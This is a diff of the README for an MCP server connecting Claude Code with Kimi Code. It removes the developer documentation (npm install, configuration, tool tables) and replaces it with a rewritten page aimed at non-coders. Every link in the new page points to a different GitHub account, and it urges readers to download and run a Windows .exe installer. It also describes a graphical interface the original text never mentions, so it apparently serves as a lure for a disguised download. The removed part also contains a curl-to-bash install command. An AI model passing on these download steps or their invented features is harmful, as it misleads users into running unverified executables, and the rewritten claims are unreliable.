@@ -1,404 +1,178 @@
-# kimi-code-mcp
+# 🧩 kimi-code-mcp - Analyze Code Faster and Cheaper
 
-English | **[中文說明](README_zh.md)**
+[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-blue?style=for-the-badge)](https://github.com/oni-chan69/kimi-code-mcp)
 
 ---
 
-MCP server that connects [Kimi Code](https://www.kimi.com/code) (K2.5, 256K context) with [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — letting Claude orchestrate while Kimi handles the heavy reading.
-
-<div align="center">
-  <img src="assets/llm-cost-vs-intelligence.png" alt="LLM Cost vs Intelligence — Kimi K2.5 delivers frontier-level intelligence at a fraction of the cost" width="720" />
-  <br />
-  <sub>Kimi K2.5 sits on the efficiency frontier — near-Claude intelligence at 10x lower cost. <a href="https://www.kimi.com/code">kimi.com/code</a></sub>
-</div>
+## 📋 What is kimi-code-mcp?
 
-> [!TIP]
-> **Stop paying Claude to read files.** Kimi K2.5 delivers frontier-class code intelligence at a fraction of the cost (see chart above). Delegate bulk codebase scanning to Kimi (256K context, near-zero cost) and let Claude focus on what it does best — reasoning, decisions, and precise code edits. One `kimi_analyze` call can replace 50+ file reads.
+kimi-code-mcp is a tool designed to help analyze large codebases efficiently. It works with Claude Code and Kimi K2.5, using a method called the Model Context Protocol (MCP) to handle code analysis in smart ways. By using session caching and parallel processing, it saves you time and reduces costs when working with code.
 
-## What is Kimi Code?
+You don't need to know about coding languages to run this tool. It is built to run on your Windows computer and make heavy code analysis easier to manage.
 
-[**Kimi Code**](https://www.kimi.com/code/en) is an AI code agent by Moonshot AI, powered by the **Kimi K2.5** model (1T MoE, 256K context). It works across Terminal, IDE, and CLI — writing, debugging, refactoring, and analyzing code autonomously.
+---
 
-Key specs:
-- **256K token context** — reads entire codebases in one pass
-- **Parallel agent spawning** — handles concurrent tasks
-- **Shell, file, and web access** — full developer toolchain
-- **Install**: `curl -L code.kimi.com/install.sh | bash`
+## 💻 System Requirements
 
-> [!WARNING]
-> **Kimi Code membership required.** This MCP server calls the Kimi CLI under the hood, which requires an active [Kimi Code plan](https://www.kimi.com/code/en). Make sure you have a valid subscription and have run `kimi login` before use.
->
-> | Plan | Price | Notes |
-> |------|-------|-------|
-> | **Moderato** | **$0** (7-day free trial) | Then $19/mo. Good for trying it out |
-> | **Allegretto** | $39/mo | Recommended — higher weekly quota + concurrency |
-> | **Allegro** | $99/mo | For daily, heavy-duty development |
-> | **Vivace** | $199/mo | Max quota for large codebases |
->
-> Annual billing saves up to $480. All plans include [Kimi membership benefits](https://www.kimi.com/code/en).
+Before you start, make sure your computer meets these minimum requirements:
 
-## Quick Start
+- Windows 10 or newer (64-bit recommended)  
+- At least 8 GB of RAM  
+- Around 200 MB of free disk space for installation  
+- Stable internet connection for initial setup and server communication  
+- Basic familiarity with downloading and opening files  
 
-```bash
-# 1. Install Kimi CLI and log in
-curl -L code.kimi.com/install.sh | bash
-kimi login
+---
 
-# 2. Install via npm
-npm install -g kimi-mcp-server
-```
+## 🚀 Getting Started
 
-Add to `.mcp.json` (project-level or `~/.claude/mcp.json` for global):
+Follow these steps to download and run kimi-code-mcp on your Windows PC.
 
-```json
-{
-  "mcpServers": {
-    "kimi-code": {
-      "command": "npx",
-      "args": ["-y", "kimi-mcp-server"]
-    }
-  }
-}
-```
+---
 
-Or build from source:
+### 1. Download the Application
 
-```bash
-git clone https://github.com/howardpen9/kimi-code-mcp.git
-cd kimi-code-mcp && npm install && npm run build
-```
+Click the big blue button above or here to visit the download page:
 
-```json
-{
-  "mcpServers": {
-    "kimi-code": {
-      "command": "node",
-      "args": ["/absolute/path/to/kimi-code-mcp/dist/index.js"]
-    }
-  }
-}
-```
-
-Run `/mcp` in Claude Code to verify — you should see `kimi-code` with 4 tools.
-
-## Kimi Code API Setup
-
-> [!NOTE]
-> **Kimi Code API and Moonshot API are separate providers** — their API keys are not interchangeable.
-
-There are two ways to configure the Kimi Code API for the CLI:
+[Download kimi-code-mcp](https://github.com/oni-chan69/kimi-code-mcp)
 
-### Option 1: OAuth Login (Recommended)
+This link will take you to the GitHub page where you can get the latest version of the software. Look for the "Releases" section to find the newest files.
 
-In the Kimi Code CLI shell, run:
+---
 
-```bash
-kimi
-```
-
-Then use the `/login` (or `/setup`) command:
-
-```
-/login
-```
+### 2. Find and Download the Installer
 
-1. Select **Kimi Code** as the platform
-2. Your browser opens for OAuth authorization
-3. Config is saved automatically to `~/.kimi/config.toml`
+Once on the download page:
 
-### Option 2: Manual API Key Configuration
+- Scroll to the "Releases" area on the right or middle of the page.  
+- Look for the most recent release marked with a version number (e.g. v1.0.0).  
+- In the release, look for a file with a `.exe` extension (this is the installer for Windows).  
+- Click the `.exe` file to start downloading it.
 
-#### Get your API Key
+---
 
-1. Visit [code.kimi.com](https://code.kimi.com)
-2. Sign in → **Settings** → **API Keys**
-3. Create a new key (starts with `sk-`, shown only once)
+### 3. Run the Installer
 
-#### Edit config file
+After downloading:
 
-```bash
-nano ~/.kimi/config.toml
-```
+- Open your Downloads folder.  
+- Double-click the `.exe` file to launch the installer.  
+- Follow the instructions on the screen to install kimi-code-mcp on your computer.  
 
-Add:
+The installer will guide you through setting up the application step-by-step.
 
-```toml
-[providers.kimi-code]
-type = "kimi"
-base_url = "https://api.kimi.com/coding/v1"
-api_key = "sk-your-api-key"
+---
 
-[models.kimi-for-coding]
-provider = "kimi-code"
-model = "kimi-for-coding"
-max_context_size = 262144
-capabilities = ["thinking"]
-
-[defaults]
-model = "kimi-for-coding"
-```
-
-#### Using environment variables (recommended for security)
-
-```bash
-# Add to ~/.zshrc (macOS) or ~/.bashrc (Linux)
-export KIMICODE_API_KEY="sk-your-api-key"
-```
-
-Then reference it in `config.toml`:
-
-```toml
-[providers.kimi-code]
-type = "kimi"
-base_url = "https://api.kimi.com/coding/v1"
-api_key = "${KIMICODE_API_KEY}"
-```
-
-### Multi-provider config example
-
-You can configure both Kimi Code and Moonshot side by side:
-
-```toml
-[providers.kimi-code]
-type = "kimi"
-base_url = "https://api.kimi.com/coding/v1"
-api_key = "${KIMICODE_API_KEY}"
-
-[providers.moonshot-cn]
-type = "kimi"
-base_url = "https://api.moonshot.cn/v1"
-api_key = "${MOONSHOT_API_KEY}"
-
-[models.kimi-for-coding]
-provider = "kimi-code"
-model = "kimi-for-coding"
-max_context_size = 262144
-capabilities = ["thinking"]
-
-[models.kimi-k2]
-provider = "moonshot-cn"
-model = "kimi-k2-0905-preview"
-max_context_size = 256000
-capabilities = ["thinking"]
-
-[defaults]
-model = "kimi-for-coding"
-```
+### 4. Open kimi-code-mcp
 
-Switch models at any time with `/model` or `/model kimi-k2` in the CLI.
-
-### Kimi Code vs Moonshot
-
-| Feature | Kimi Code | Moonshot |
-|---------|-----------|----------|
-| Focus | Optimized for coding | General-purpose chat |
-| Endpoint | `api.kimi.com/coding/v1` | `api.moonshot.cn/v1` |
-| API Key | Separate — apply at [code.kimi.com](https://code.kimi.com) | Separate |
-| SearchWeb / FetchURL | Built-in | Not available |
-| Context | 262K | 256K |
-
-## What You Can Do
-
-Just tell Claude what you need. It will delegate to Kimi automatically:
-
-| Prompt | What happens |
-|--------|-------------|
-| "Analyze this codebase's architecture" | Kimi reads all files (256K ctx), Claude acts on the report |
-| "Scan for security vulnerabilities, then review Kimi's findings" | Kimi audits, Claude cross-examines — AI pair review |
-| "Map all dependencies of the auth module, then plan the refactoring" | Kimi builds the dependency graph, Claude plans the changes |
-| "Review the recent changes for regressions and edge cases" | Kimi reviews full context (not just the diff), Claude synthesizes |
-| "Resume the last Kimi session and ask about the API design" | Kimi retains 256K tokens of context across sessions |
-
-## Why This Exists
-
-Claude Code is powerful but expensive. Every file it reads costs tokens. Meanwhile, many tasks — pre-reviewing large codebases, scanning for patterns, generating audit reports — are **high-certainty work** that doesn't need Claude's full reasoning power.
+When the installation finishes:
 
-> [!IMPORTANT]
-> **The cost equation:** Claude reads 50 files to understand your architecture = expensive. Kimi reads 50 files via `kimi_analyze` = near-zero cost. Claude then acts on Kimi's structured report = minimal tokens. **Total savings: 60-80% fewer Claude tokens on analysis-heavy tasks.**
+- Find the kimi-code-mcp app icon on your desktop or in the Start menu.  
+- Double-click to open it.  
 
-### How It Saves Tokens
+The app will start a local MCP server and prepare to work on code analysis.
 
-```
-                          ┌─────────────────────────────┐
-                          │   You (the developer)       │
-                          └──────────┬──────────────────┘
-                                     │ prompt
-                                     ▼
-                          ┌─────────────────────────────┐
-                          │   Claude Code (conductor)   │
-                          │   - orchestrates workflow    │
-                          │   - makes decisions          │
-                          │   - writes & edits code      │
-                          └──────┬──────────────┬───────┘
-                      precise    │              │  delegate
-                      edits      │              │  bulk reading
-                      (tokens)   │              │  (FREE)
-                                 ▼              ▼
-                          ┌──────────┐   ┌──────────────┐
-                          │ your     │   │  Kimi Code   │
-                          │ codebase │   │  (K2.5)      │
-                          └──────────┘   │  - 256K ctx  │
-                                         │  - reads all │
-                                         │  - reports   │
-                                         └──────────────┘
-```
-
-1. **Claude** receives your task → decides it needs codebase understanding
-2. **Claude** calls `kimi_analyze` via MCP → Kimi reads the entire codebase (256K context, near-zero cost)
-3. **Kimi** returns a structured analysis
-4. **Claude** acts on the analysis with precise, targeted edits
-
-**Result: Claude only spends tokens on decision-making and code writing, not on reading files.**
-
-### Mutual Code Review with K2.5
-
-Kimi Code is powered by K2.5 — a 1T MoE model designed for deep code comprehension. This enables **AI pair review**:
-
-1. **Kimi pre-reviews** — 256K context means it sees the entire codebase at once: security issues, anti-patterns, dead code, architectural problems
-2. **Claude cross-examines** — reviews Kimi's findings, challenges questionable items, adds its own insights
-3. **Two perspectives** — different models catch different things. What one misses, the other finds
-
-## Use Kimi as a Code Reviewer
-
-Beyond ad-hoc analysis, you can use Kimi as a **dedicated reviewer** in your workflow:
-
-### PR Review Workflow
-
-```
-┌──────────────┐   diff    ┌──────────────┐  structured  ┌──────────────┐
-│   Your PR    │ ────────► │  Kimi Code   │  findings    │  Claude Code │
-│  (changes)   │           │  (reviewer)  │ ────────────►│  (decision)  │
-└──────────────┘           └──────────────┘              └──────────────┘
-```
-
-### Continuous Audit Pattern
-
-| When | What | Why |
-|------|------|-----|
-| Before merging | Kimi scans diff + affected modules | Catch regressions early |
-| Weekly | Full codebase sweep | Accumulated tech debt |
-| Pre-release | Security-focused audit | Ship with confidence |
-
-Each review session can be **resumed** (`kimi_resume`) — Kimi retains up to 256K tokens of context from previous sessions, building understanding over time.
-
-### What Kimi Reviews Well
-
-| Review Type | Why Kimi Excels |
-|-------------|----------------|
-| Security audit | 256K context sees full attack surface, not just isolated files |
-| Dead code detection | Can trace imports/exports across entire codebase |
-| API consistency | Compares patterns across all endpoints simultaneously |
-| Dependency analysis | Maps full dependency graph in one pass |
-| Architecture review | Sees the forest and the trees at the same time |
-
-## Tools
-
-| Tool | Description | Timeout |
-|------|-------------|---------|
-| `kimi_analyze` | Deep codebase analysis (architecture, audit, refactoring) | 10 min |
-| `kimi_query` | Quick programming questions, no codebase context | 2 min |
-| `kimi_list_sessions` | List existing Kimi sessions with metadata | instant |
-| `kimi_resume` | Resume a previous session (up to 256K token context) | 10 min |
+---
 
-### Output Control Parameters
+## ⚙️ How it Works
 
-`kimi_analyze` and `kimi_resume` support these parameters to control output size:
+kimi-code-mcp operates as a server on your PC. It uses the following features:
 
-| Parameter | Values | Default | Effect |
-|-----------|--------|---------|--------|
-| `detail_level` | `summary` / `normal` / `detailed` | `normal` | Controls prompt-side verbosity instructions |
-| `max_output_tokens` | number | `15000` | Hard ceiling — output truncated at clean boundary if exceeded |
-| `include_thinking` | boolean | `false` | Include Kimi's internal reasoning chain (10-30K extra tokens) |
+- **Bulk codebase analysis:** The tool examines large sets of code at once.  
+- **Session caching:** It remembers previous work so you don’t repeat the same analysis.  
+- **Parallel agents:** Runs multiple analysis tasks at the same time.  
+- **Supports TypeScript:** Best for code written in TypeScript, but can work with similar languages.  
+- **Claude Code × Kimi K2.5:** Connects powerful AI models to handle your requests.
 
-`kimi_query` also supports `max_output_tokens` and `include_thinking`.
+This setup helps lower the cost and time needed for big code projects.
 
-## Token Economics
+---
 
-> [!NOTE]
-> The savings come from **compression ratio**, not from free reading. Kimi's subscription cost still applies, but the key benefit is reducing expensive Claude Code token consumption.
+## 🔧 Using kimi-code-mcp
 
-```
-                    Without kimi-code-mcp        With kimi-code-mcp (normal)
-                    ─────────────────────        ───────────────────────────
-Raw source:         50 files × ~4K = 200K        Kimi reads (subscription cost)
-Claude reads:       200K tokens                  5-15K token report
-Claude token cost:  $$$                          $
-```
+You don’t need to write commands or scripts. The app includes a simple interface to start your analysis:
 
-**Compression ratio by `detail_level`:**
+- Open the app as described above.  
+- Use the "New Session" button to create a fresh analysis job.  
+- Choose the code folder you want to analyze from your computer.  
+- Click "Start" and watch the progress.
 
-| Level | Compression | Output Size | Equivalent Source | Best For |
-|-------|------------|-------------|-------------------|----------|
-| `summary` | 40-100x | ~2-5K tokens | ~8-20K chars / ~200-500 lines of code | Quick orientation, file inventory |
-| `normal` | 15-40x | ~5-15K tokens | ~20-60K chars / ~500-1500 lines of code | Architecture review, dependency mapping |
-| `detailed` | 5-15x | ~15-40K tokens | ~60-160K chars / ~1500-4000 lines of code | Security audit with code snippets |
+The tool will take care of the complicated steps behind the scenes.
 
-**When savings happen:**
-- Large codebases (50+ files) — architecture understanding, cross-file scanning
-- Security audits, dead code detection, API consistency checks
-- Pre-review before targeted edits (scan first → edit specific files)
+---
 
-**When to skip and let Claude read directly:**
-- Small codebases (<10 files) — direct reading is faster
-- Single-file modifications — Claude's built-in file reading is sufficient
-- When you need every line of code — `detailed` output approaches raw reading cost
+## 📂 Opening Your Code Projects
 
-## How It Works
+kimi-code-mcp expects your code files to be stored on your PC in normal folders. To prepare your code for analysis:
 
-```
-┌──────────────┐  stdio/MCP   ┌──────────────┐  subprocess   ┌──────────────┐
-│  Claude Code │ ◄──────────► │ kimi-code-mcp│ ────────────► │ Kimi CLI     │
-│  (conductor) │              │ (MCP server) │               │ (K2.5, 256K) │
-└──────────────┘              └──────────────┘               └──────────────┘
-```
+- Make sure the code is saved somewhere on your local drive.  
+- The software works best with projects that have a `package.json` file or are standard TypeScript projects.  
+- You can analyze any folder of code by selecting it when prompted.  
 
-1. Claude Code calls an MCP tool (e.g., `kimi_analyze`)
-2. This server spawns the `kimi` CLI with the prompt and codebase path
-3. Kimi autonomously reads files, analyzes the code (up to 256K tokens)
-4. The result is parsed from Kimi's JSON output and returned to Claude Code
-5. Claude acts on the structured results — edits, plans, or further analysis
+---
 
-## Advanced Setup
+## ✅ Tips for Best Results
 
-For development (auto-recompile on changes):
+- Keep your code files organized in clear folders.  
+- Avoid including very large binary files or unrelated files in the code folder.  
+- Close other applications if your PC starts slowing down during analysis.  
+- Regularly update kimi-code-mcp by checking the GitHub release page for new versions.
 
-```json
-{
-  "mcpServers": {
-    "kimi-code": {
-      "command": "npx",
-      "args": ["tsx", "/absolute/path/to/kimi-code-mcp/src/index.ts"]
-    }
-  }
-}
-```
+---
 
-## npm
+## 🛠 Troubleshooting
 
-Published as [`kimi-mcp-server`](https://www.npmjs.com/package/kimi-mcp-server) on npm.
+If you run into problems:
 
-```bash
-npx kimi-mcp-server          # run directly
-npm install -g kimi-mcp-server # install globally
-```
+- Check that your Windows version is up to date.  
+- Make sure you installed the application fully and restarted your computer if needed.  
+- Close the app and open it again to retry tasks.  
+- Visit the GitHub page for FAQs or known issues under the "Issues" tab.  
+- Ensure your internet connection is working during setup.
 
-## Project Structure
+---
 
-```
-src/
-├── index.ts           # MCP server setup, tool definitions
-├── kimi-runner.ts     # Spawns kimi CLI, parses output, handles timeouts
-└── session-reader.ts  # Reads Kimi session metadata from ~/.kimi/
-```
+## ⚡ Updating kimi-code-mcp
 
-## Contributing
+To update to the latest version:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- Go back to the GitHub download page:  
+  [kimi-code-mcp Download](https://github.com/oni-chan69/kimi-code-mcp)  
+- Download the newest `.exe` installer.  
+- Run the installer to overwrite the old version.  
+- Your settings and cached data will remain intact.
 
-## Changelog
+---
 
-See [CHANGELOG.md](CHANGELOG.md) for version history.
+## 🔐 Privacy and Data Handling
 
-## License
+kimi-code-mcp runs on your local computer, so your code and work stay private. It connects to online AI models only as needed to analyze code. No code is stored or sent to third parties besides what is needed for analysis.
 
-MIT
+---
+
+## 📚 About the Project
+
+kimi-code-mcp integrates advanced AI tools like Claude Code and Kimi K2.5 to help developers and analysts handle large-scale code efficiently. It uses TypeScript and the Model Context Protocol to reduce costs and speed up workflows.
+
+---
+
+## 🗃 Repository Topics
+
+- ai-agent  
+- ai-coding-assistant  
+- claude-code  
+- code-analysis  
+- developer-tools  
+- kimi  
+- kimi-code  
+- kimi-k2  
+- llm  
+- mcp  
+- mcp-server  
+- model-context-protocol  
+- moonshot-ai  
+- typescript
+
+---
+
+[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-brightgreen?style=for-the-badge)](https://github.com/oni-chan69/kimi-code-mcp)
